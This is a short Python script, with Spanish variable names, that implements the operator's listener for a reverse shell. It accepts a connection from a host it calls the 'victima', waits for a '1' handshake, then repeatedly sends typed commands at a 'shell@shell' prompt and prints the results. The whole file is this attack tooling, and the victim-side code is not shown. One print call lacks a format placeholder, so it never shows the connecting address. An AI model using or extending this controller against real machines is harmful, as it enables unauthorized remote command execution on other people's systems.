import socket

server= socket.socket()
server.bind(('localhost', 8080))
server.listen(1)

while True:
  victima, direccion =  server.accept()
  print('Conexion de: '.format(direccion))
  msjBinario = victima.recv(1024)
  msjCodificado = msjBinario.decode('ascii')

  if msjCodificado == '1':
    while True:
      opcion = input('shell@shell: ')
      victima.send(opcion.encode('ascii'))
      resultado =  victima.recv(2048)
      print(str(resultado))
  else:
    print('Error')
    break
